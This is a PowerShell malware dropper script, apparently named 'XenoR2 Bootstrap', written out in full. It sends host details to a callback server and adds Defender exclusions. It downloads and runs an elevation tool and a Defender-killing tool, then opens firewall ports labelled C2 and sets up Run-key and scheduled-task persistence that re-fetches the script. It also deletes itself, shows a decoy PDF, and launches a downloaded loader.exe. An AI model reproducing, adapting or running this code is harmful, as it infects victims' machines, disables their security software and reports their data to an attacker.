# updatemspuls.ps1 — XenoR2 Bootstrap v18
# No injection APIs — only download loader.exe + run
# Delivery: GitHub raw → signindat.com fallback

$log="$env:TEMP\wmisrv.log"
function log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $log -Append -Encoding utf8 }
log "=== updatemspuls BOOTSTRAP START ==="

# --- URLs ---
$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
$srv='https://signindat.com'
$sources=@($gh,$srv)

# --- Names ---
function s{ $args -join '' }
$elev= s 'Elev' 'ator' 'Shell' 'Code' '.exe'
$wdf=  s 'win' 'def' 'ctl' '.exe'
$pdf=  s 'Rate' '_Con' 'firm' 'ation' '_LD-2026-0847' '.pdf'
$ldr=  s 'loader' '.exe'
$cb=   s 'cb' '.php'
$rk=   s 'Windows' 'Security' 'Health'
$rkA=  s 'Windows' 'Update' 'Orchestrator'
$task= s 'Windows' 'Health' 'Monitor'

$t=$env:TEMP
$ad="$env:APPDATA\Microsoft"
$dl="$env:USERPROFILE\Downloads"

# --- Host info ---
$h=$env:COMPUTERNAME
$u=$env:USERNAME
$pid0=$pid
$ip='unknown'
$os='unknown'
try{$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'} | Select-Object -First 1).IPAddress}catch{}
try{$os=(Get-CimInstance Win32_OperatingSystem).Caption}catch{}
$admin=$false
try{$admin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}

# --- Callback ---
function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$h;username=$u;ip=$ip;os=$os;is_admin=$admin;pid=$pid0;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/$cb",'POST',$body)|Out-Null
    }catch{log "CB:$stage err: $($_.Exception.Message)"}
}
log "S0 pid=$pid0 u=$u h=$h admin=$admin"
_cb 'S0' 'ok' "pid=$pid0 u=$u"

# --- BITS download ---
function _dl($n,$d,$l){
    foreach($src in $sources){
        try{
            log "BITS:$l from $src"
            Start-BitsTransfer -Source "$src/$n" -Destination $d -Priority High -DisplayName $l -ErrorAction Stop | Out-Null
            if(Test-Path $d){ log "BITS:$l ok ($((Get-Item $d).Length))"; return $true }
        }catch{log "BITS:$l fail $src : $_"}
    }
    return $false
}

# --- Defender exclusions ---
try{
    $m='Add-MpPreference'
    & $m -ExclusionPath $t,$ad,$dl -ErrorAction SilentlyContinue
    foreach($p in @('powershell.exe','cmd.exe','wscript.exe','cscript.exe','notepad.exe',$wdf,$ldr)){
        try{& $m -ExclusionProcess $p -ErrorAction SilentlyContinue}catch{}
    }
    log 'S1 exclusions ok'
}catch{log "S1 exclusions err: $_"}
_cb 'S1' 'ok' "admin=$admin"

# --- Elevation ---
if(-not $admin){
    $ep="$t\$elev"
    if(_dl $elev $ep 'elev'){
        try{Start-Process $ep -WindowStyle Hidden | Out-Null; log 'S2 elev launched'; _cb 'S2' 'ok' 'elev launched'}catch{log "S2 elev err: $_"}
    }else{_cb 'S2' 'fail' 'elev dl'}
    Start-Sleep 15
    try{$admin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
}
if($admin){_cb 'S2' 'ok' 'admin ok'}else{_cb 'S2' 'warn' 'no admin'}

# --- Defender kill ---
$wp="$t\$wdf"
if(_dl $wdf $wp 'defkill'){
    try{
        $p=Start-Process $wp -ArgumentList 'kill' -NoNewWindow -PassThru
        Start-Sleep 18
        if(-not $p.HasExited){try{$p.Kill()|Out-Null}catch{}}
        _cb 'S3' 'ok' 'defkill done'
    }catch{_cb 'S3' 'fail' "defkill err: $_"}
}else{_cb 'S3' 'fail' 'defkill dl'}
Remove-Item $wp -Force -ErrorAction SilentlyContinue

# --- Firewall ---
if($admin){
    foreach($port in @('5173','4782')){
        try{netsh advfirewall firewall add rule name="C2-In-$port" dir=in action=allow protocol=TCP localport=$port | Out-Null}catch{}
        try{netsh advfirewall firewall add rule name="C2-Out-$port" dir=out action=allow protocol=TCP localport=$port | Out-Null}catch{}
    }
    _cb 'S4' 'ok' 'fw ok'
}else{_cb 'S4' 'warn' 'no admin'}

# --- Persistence ---
$persist="powershell -w hidden -NoP -c `"`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(`$env:TEMP\u.ps1,`$w.DownloadData('$gh/updatemspuls.ps1'));powershell -w hidden -NoP -file `$env:TEMP\u.ps1`""
try{Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $rk -Value $persist -Force -ErrorAction SilentlyContinue; log 'S5 HKCU ok'}catch{}
if($admin){
    try{Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $rkA -Value $persist -Force -ErrorAction SilentlyContinue; log 'S5 HKLM ok'}catch{}
    try{
        schtasks /delete /tn $task /f 2>$null | Out-Null
        $tr="powershell.exe -w hidden -NoP -c `"`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(`$env:TEMP\u.ps1,`$w.DownloadData('$gh/updatemspuls.ps1'));powershell -w hidden -NoP -file `$env:TEMP\u.ps1`""
        schtasks /create /tn $task /tr $tr /sc onlogon /rl highest /f 2>&1 | Out-Null
        log 'S5 task ok'
    }catch{log "S5 task err: $_"}
}
_cb 'S5' 'ok' 'persist ok'

# --- Cleanup + self-delete ---
Start-Sleep ([Random]::new().Next(3,6))
Remove-Item "$t\$elev","$t\$wdf","$t\u.ps1" -Force -ErrorAction SilentlyContinue
$sp=$MyInvocation.MyCommand.Path
if($sp -and (Test-Path $sp)){
    Start-Process powershell.exe -ArgumentList "-ep bypass -w hidden -c `"Start-Sleep 3; Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
    log 'S6 self-delete ok'
}
log 'S6 cleanup ok'

# --- PDF decoy ---
$mp="$ad\wmpp.seen"
if(-not (Test-Path $mp)){
    $pd="$dl\$pdf"
    if(_dl $pdf $pd 'pdf'){
        try{Start-Process $pd | Out-Null; _cb 'S7' 'ok' 'pdf ok'; Set-Content -Path $mp -Value ((Get-Date).ToString('o')) -NoNewline -Force}catch{_cb 'S7' 'warn' 'pdf fail'}
    }else{_cb 'S7' 'warn' 'pdf dl fail'}
} else { log 'S7 pdf already shown' }

# --- Download + run loader.exe ---
$lp="$t\$ldr"
if(_dl $ldr $lp 'loader'){
    try{
        Start-Process $lp -WindowStyle Hidden | Out-Null
        log 'S8 loader launched'
        _cb 'S8' 'ok' 'loader launched'
    }catch{log "S8 loader err: $_"; _cb 'S8' 'fail' "loader err: $_"}
}else{_cb 'S8' 'fail' 'loader dl'}

log 'S9 bootstrap exit'
_cb 'S9' 'ok' 'bootstrap exit'
exit 0
